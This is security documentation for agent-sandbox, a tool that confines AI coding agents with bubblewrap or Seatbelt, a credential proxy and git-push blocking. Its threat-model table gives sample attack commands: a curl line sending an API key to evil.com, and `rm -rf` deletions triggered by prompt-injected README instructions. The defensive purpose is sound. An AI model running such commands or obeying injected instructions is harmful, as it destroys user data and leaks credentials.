# Security Model

## Threat Model

The sandbox protects your **host machine from the agent**, not secrets from the agent. The agent still has its own API key (it needs one to function) and can see whatever MCP server credentials are in its config. The sandbox is **not** a defense against a compromised agent binary or a kernel-level exploit -- for that, use a VM.

Four threat categories, ordered by likelihood:

| Category | Description | Example |
|----------|-------------|---------|
| **Prompt injection** | Malicious code in a repository triggers destructive commands | A repo's README contains hidden instructions that cause the agent to `rm -rf ~` |
| **Hallucination** | The agent generates dangerous commands from a plausible but incorrect reasoning chain | `git push --force origin main` or `rm -rf /` from a confused model |
| **Accidental damage** | Overly broad file operations that spill outside the project | A bulk rename that touches sibling directories |
| **API key exfiltration** | A prompt-injected agent extracts API keys from environment variables or config files and sends them to an attacker | `curl https://evil.com/?key=$ANTHROPIC_API_KEY` |

---

## Defense Layers

Ten layers of defense, most enabled by default:

| Layer | Feature | Default |
|-------|---------|---------|
| Filesystem isolation | Read-only root, tmpfs home | Always on |
| PID namespace | Host processes invisible to sandbox | On |
| Env var clearing | Only whitelisted vars pass through | Always on |
| Git push blocking | Wrapper script + sanitized gitconfig | On |
| Network namespace | Block all outbound network at the kernel (`bwrap --unshare-net`) | Opt-in (auto-on in `paranoid`) |
| Credential proxy | API keys never enter sandbox | Opt-in (auto-on in `paranoid`) |
| Cloud SSRF blocking | Metadata endpoints blocked by proxy | On (when proxy enabled) |
| Config snapshots | Auto-snapshot before each run | On |
| Project snapshots | Snapshot writable project directory | Opt-in |
| Learn mode | Discover actual access needs via strace | On-demand |

---

## Sandbox Levels

Defense layers compose into three named **sandbox levels**, selected per run with `--sandbox-level`:

- `paranoid` — kernel-level network isolation (`unshare_net = true`) plus auto-enabled credential proxy reached via a unix socket bind-mounted into the sandbox. Only allowlisted hosts are reachable.
- `normal` — the default. Network is open; credential proxy is opt-in.
- `permissive` — `normal` plus extra host paths exposed read-only (e.g. `~/.config/gh`, `~/.cache`) for `gh` CLI workflows.

Levels are loaded from policy fragments in `sandbox/profiles/<level>.toml` (built-in) or `~/.agent-sandbox/profiles/<level>.toml` (user-supplied) and deep-merged on top of the resolved config. List keys (`home_ro_dirs`, `allow_domains`) are append-merged so extending a level doesn't require forking the file.

For the full level matrix, per-backend behavior, and how to ship a custom level, see [Sandbox Levels](dashboard/sandbox-levels.md).

---

## What It Blocks

| Attack Vector | Protection | How |
|---------------|------------|-----|
| File deletion/modification | Entire filesystem read-only except project dir | `--ro-bind / /` + `--tmpfs $HOME` |
| SSH key theft | `~/.ssh` does not exist inside sandbox | Hidden by tmpfs overlay on `$HOME` |
| Cloud credential theft | `~/.aws`, `~/.config/gcloud`, etc. invisible | Hidden by tmpfs overlay on `$HOME` |
| Git push | Blocked at three layers | Wrapper script + sanitized `.gitconfig` + no credential helpers |
| API key exfiltration | Credential proxy keeps keys outside sandbox | Reverse proxy injects headers; keys never enter sandbox env |
| Cloud SSRF | Metadata endpoints blocked | Proxy blocks `169.254.169.254`, `metadata.google.internal`, etc. |
| Environment variable leaks | Only whitelisted vars pass through | `--clearenv` + explicit `--setenv` |
| Process killing/inspection | Host processes invisible | `--unshare-pid` (PID namespace) |
| System modification | Cannot write to `/usr`, `/etc`, `/var` | Read-only root filesystem |
| DBus/desktop access | Session bus socket hidden | `--tmpfs /run` |
| X11/Wayland keylogging | Display sockets hidden | `--tmpfs /tmp` |
| Cron/systemd persistence | Cannot create services or cron jobs | Read-only `/etc`, tmpfs `/run` |

---

## What It Allows

| Capability | Why | How |
|------------|-----|-----|
| Read/write project directory | Agent needs to edit your code | `--bind $PWD $PWD` (writable) |
| Read other projects | Agent may reference sibling repos | `--ro-bind ~/project ~/project` (configurable) |
| Network access | Open in `normal` and `permissive` for API calls, pip, npm, git clone — credential proxy is **off** by default at both, the agent reaches APIs directly. In `paranoid` only the credential proxy is reachable. | No `--unshare-net` in `normal`/`permissive`; `bwrap --unshare-net` set in `paranoid` |
| Build tools | python, node, cargo, make, gcc, etc. | System dirs read-only + `$HOME` PATH dirs auto-detected (including deep subdirectories) |
| Agent config | Settings, MCP servers, skills | Isolated copy in `~/.agent-sandbox/claude-config` |
| Package caches | cargo, npm, go can download dependencies | Persistent writable dirs for registry/cache subdirectories |
| Filesystem snapshots | Undo agent damage to project or config | rsync hardlink-based snapshots with interactive restore |

---

## How It Works

agent-sandbox builds a [bubblewrap](https://github.com/containers/bubblewrap) command that creates a Linux mount namespace -- a "view" of the filesystem where most paths are read-only, and `$HOME` is replaced by a fresh tmpfs with selective bind mounts.

```
/                           read-only   (entire OS visible but unmodifiable)
├── /tmp                    fresh tmpfs (empty, writable, isolated)
├── /run                    fresh tmpfs (hides DBus, Wayland sockets)
├── /dev                    minimal     (null, zero, random only)
├── /proc                   namespaced  (only sandbox processes visible)
└── /home/you               tmpfs       (entire home hidden)
    ├── .ssh                GONE        (does not exist)
    ├── .aws                GONE
    ├── .gnupg              GONE
    ├── .gitconfig          sanitized   (read-only, no credential helpers)
    ├── .claude/            SANDBOX     (writable isolated copy)
    ├── .local/             read-only   (auto-detected from PATH)
    ├── .cargo/             read-only   (binaries), writable (registry cache)
    ├── project/            read-only   (sibling repos visible)
    │   └── myrepo/         WRITABLE    (your current project)
    └── ...other PATH dirs  read-only   (auto-detected, deep subdirs included)
```

Environment variables are cleared (`--clearenv`) and only an explicit whitelist is injected. This prevents leaking `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, or any other secret from your shell.

---

## Git Push Blocking

Git push is blocked at three independent layers:

1. **Wrapper script** -- a `git` wrapper placed first in `$PATH` intercepts `git push` and returns an error before the real git binary runs.
2. **Sanitized gitconfig** -- the `.gitconfig` mounted inside the sandbox has all `[credential]` sections and `[url "..."]` rewrite rules stripped.
3. **No credential helpers** -- without credential helpers or SSH keys, any push that bypasses the wrapper fails authentication anyway.

The `push.default` git option is forced to `nothing`, so even a bare `git push` does nothing.

---

## Credential Proxy

The credential proxy keeps API keys outside the sandbox entirely. Instead of passing `ANTHROPIC_API_KEY` into the sandbox environment, a proxy runs on the host, intercepts API calls, and injects the correct authentication header. A prompt-injected agent cannot exfiltrate the key because it never exists in the sandbox's memory.

By default the proxy is **off** at `normal` and `permissive` and only kicks in when the user opts into `[security] credential_proxy = true` in their config. When opted in (or at `paranoid`, where it's mandatory), the agent's `*_BASE_URL` is rewritten to point at the proxy. At `normal`/`permissive` the proxy is reached via TCP loopback (`http://localhost:PORT`); at `paranoid` it's reached via a unix socket bind-mounted into the sandbox, with an in-sandbox `socat` bridge presenting the socket as plain TCP localhost so any SDK that uses `*_BASE_URL` works unchanged.

Enable it in `config.toml`:

```toml
[security]
credential_proxy = true
```

`paranoid` enables `credential_proxy = true` automatically and also sets `unshare_net = true` so the agent can only reach the proxy.

### How it works

1. The proxy starts on a random localhost port before the sandbox launches.
2. The agent's `*_BASE_URL` env var is rewritten to `http://localhost:PORT`.
3. The agent SDK sends requests to the local proxy.
4. The proxy injects the real API key header and forwards to the upstream API over HTTPS.
5. Non-API traffic (package managers, git clone) passes through via CONNECT tunneling without credential injection.

### Env-var-to-domain mapping

| Env Var | API Domain | Header |
|---------|------------|--------|
| `ANTHROPIC_API_KEY` | `api.anthropic.com` | `x-api-key` |
| `ANTHROPIC_AUTH_TOKEN` | `api.anthropic.com` | `Authorization: Bearer` |
| `OPENAI_API_KEY` | `api.openai.com` | `Authorization: Bearer` |
| `GOOGLE_API_KEY` | `generativelanguage.googleapis.com` | `x-goog-api-key` |
| `GEMINI_API_KEY` | `generativelanguage.googleapis.com` | `x-goog-api-key` |

### SSRF blocking

Cloud metadata endpoints are always blocked when the proxy is enabled:

- `169.254.169.254`
- `metadata.google.internal`
- `metadata.azure.internal`

Additional hosts can be blocked via `[credential_proxy].blocked_hosts`.

---

## Environment Variable Isolation

All host environment variables are stripped with `--clearenv`. Only two sources of variables enter the sandbox:

1. **`[env].passthrough`** -- an explicit whitelist of host vars (terminal settings, locale). API keys should never be listed here.
2. **Provider `env` sections** -- credentials and settings injected via `--setenv` from `[<agent>.providers.<name>.env]` (legacy `[<agent>.profiles.<name>.env]` still works — see gh#81). These do not need to exist in the host shell.

Static variables can also be set via `[env.extra]` for every run regardless of provider.

---

## What This Does NOT Protect Against

| Limitation | Details |
|------------|---------|
| **Network is open in `normal`** | The default level (`normal`) leaves the network open: the agent can make outbound HTTP for API calls, package managers, and git clone. A prompt injection could exfiltrate project source code. Mitigations: enable `credential_proxy = true` to block API key exfiltration and cloud SSRF, or run with `--sandbox-level paranoid` which sets `unshare_net = true` and forces all egress through an allowlisted credential proxy |
| **Git push bypass** | The agent could call `/usr/bin/git push` directly, bypassing the wrapper. However, without SSH keys or credential helpers, authentication fails. The wrapper is defense-in-depth |
| **Not a VM** | bubblewrap uses Linux namespaces, a kernel feature. A kernel vulnerability in namespace handling could theoretically allow escape. For higher assurance, run the sandbox inside a VM |
| **Linux only** | agent-sandbox requires bubblewrap, which depends on Linux kernel namespaces. macOS users can use the [nono](https://github.com/always-further/nono) backend (Landlock/Seatbelt) |
| **MCP server secrets** | If `~/.claude/settings.json` contains API keys in MCP server env vars, those are copied to the sandbox. Review `~/.agent-sandbox/claude-config/settings.json` after init. With `credential_proxy = true`, API keys configured in providers stay outside the sandbox |
| **Tmpfs home is writable** | The `$HOME` tmpfs overlay is writable (that is how tmpfs works). The agent can create temporary files like `~/temp.txt`, but they are ephemeral and vanish when the sandbox exits. They never touch your real home directory |
| **Credential proxy and HTTPS** | The proxy rewrites `*_BASE_URL` to `http://localhost:PORT`. All major AI SDKs support base URL overrides, so this is transparent. Custom HTTP clients that ignore `*_BASE_URL` env vars will not benefit from the proxy |
| **Learn mode accuracy** | `strace` captures actual I/O but may miss paths checked with `access()` or `stat()` without opening. The learn sandbox is permissive, so the agent may access paths blocked in the real sandbox. Use the report as guidance, not as an exhaustive spec |
| **Snapshot disk usage** | Snapshots use hardlinks for deduplication but still consume disk for changed files. Monitor with `agent-sandbox snapshot-list` and configure `max_project_snapshots` / `max_config_snapshots` |

---

## Build Tools Inside the Sandbox

Build tools work with minimal friction because system directories are read-only and package caches are redirected to persistent writable directories.

| Tool | How it works |
|------|-------------|
| **pip** | Use a virtual environment inside the project directory. The venv is writable, so `pip install` works normally |
| **npm** | `node_modules/` is created in the project directory. The npm download cache is redirected to `~/.agent-sandbox/toolchains/npm-cache/` |
| **cargo** | Binaries under `~/.cargo/bin/` are available read-only. Registry and git caches are mounted writable from `~/.agent-sandbox/toolchains/cargo/`. `cargo install` of new tools will fail (read-only binaries) |
| **go** | `GOPATH` and `GOMODCACHE` are redirected to `~/.agent-sandbox/toolchains/go/`. `go build` and `go mod download` work normally |
| **System tools** | Everything in `/usr/bin`, `/usr/local/bin`, etc. is available read-only. Tools installed under `$HOME` (nvm, pyenv, sdkman) are auto-detected from `$PATH` and exposed read-only |

---

## Seatbelt Backend (macOS)

On macOS the Seatbelt backend (`sandbox-exec`) replaces bubblewrap. Seatbelt is Apple's built-in mandatory access control framework; it operates at the filesystem and process level but does **not** provide kernel-level namespace isolation.

### Limitation Matrix

The table below compares each defense layer between bwrap (Linux) and Seatbelt (macOS):

| Defense Layer | bwrap (Linux) | Seatbelt (macOS) | Notes |
|---|---|---|---|
| Filesystem write isolation | `--ro-bind / /` + allowlist | `(deny file-write*)` + allowlist | Equivalent enforcement |
| PID namespace | `--unshare-pid` | **Not available** | Agent can see and signal host processes |
| Network namespace | `--unshare-net` | **Not available** | Agent can make direct network connections; credential proxy is userland only |
| Env var clearing | `--clearenv` + `--setenv` | `env -i` wrapper | Equivalent enforcement |
| Credential proxy | Host-side, kernel-netns-gated | Host-side, userland | Proxy runs but cannot enforce at kernel level |
| Git push blocking | PATH wrapper | PATH wrapper | Equivalent enforcement |
| Config snapshots | rsync hardlinks | rsync hardlinks | Equivalent enforcement |
| Learn mode (strace) | `strace -f -e trace=...` | **Not available** | macOS lacks strace; use DTrace or cross-platform profile porting |
| Cloud SSRF blocking | Proxy-level block | Proxy-level block | Equivalent enforcement |
| Process fork/exec control | bwrap defaults | `(allow process-fork)` / `(allow process-exec)` | Seatbelt allows by default; bwrap allows by default |

### Paranoid on macOS vs Linux

Paranoid level on the Seatbelt backend provides a **reduced but still meaningful** isolation envelope:

- **What works**: filesystem write isolation, environment variable clearing, credential proxy (userland), git push blocking, config snapshots.
- **What does not work**: kernel-level network namespace isolation (`--unshare-net`), PID namespace isolation, strace-based learn mode.

When paranoid is selected with the Seatbelt backend, `agent-sandbox` prints clear warnings listing exactly which features are unavailable and then proceeds -- the user explicitly requested paranoid and the remaining defenses still provide real value.

**Network hardening recommendation for macOS**: to approximate the Linux kernel network namespace on macOS, you can use `pfctl` (Packet Filter) to restrict the sandboxed process's outbound traffic. Example:

```bash
# Create an anchor that blocks all outbound except the Anthropic API
echo 'block drop out proto tcp from any to any
pass out proto tcp from any to api.anthropic.com' | sudo pfctl -ef - 2>/dev/null
```

Note: `pfctl` rules apply system-wide and require root. They are not scoped to a single process unless combined with `pfctl` anchors and process-level UID/GID filtering. This is a manual, external hardening step -- `agent-sandbox` does not manage `pfctl` rules automatically.

---

## See Also

- [CLI Reference](sandbox/cli-reference.md) -- command synopsis, flags, and usage examples
- [Configuration Reference](sandbox/config-reference.md) -- every TOML key documented
- [Cheatsheet](https://github.com/RisorseArtificiali/lince/blob/main/sandbox/CHEATSHEET.md) -- quick-reference card
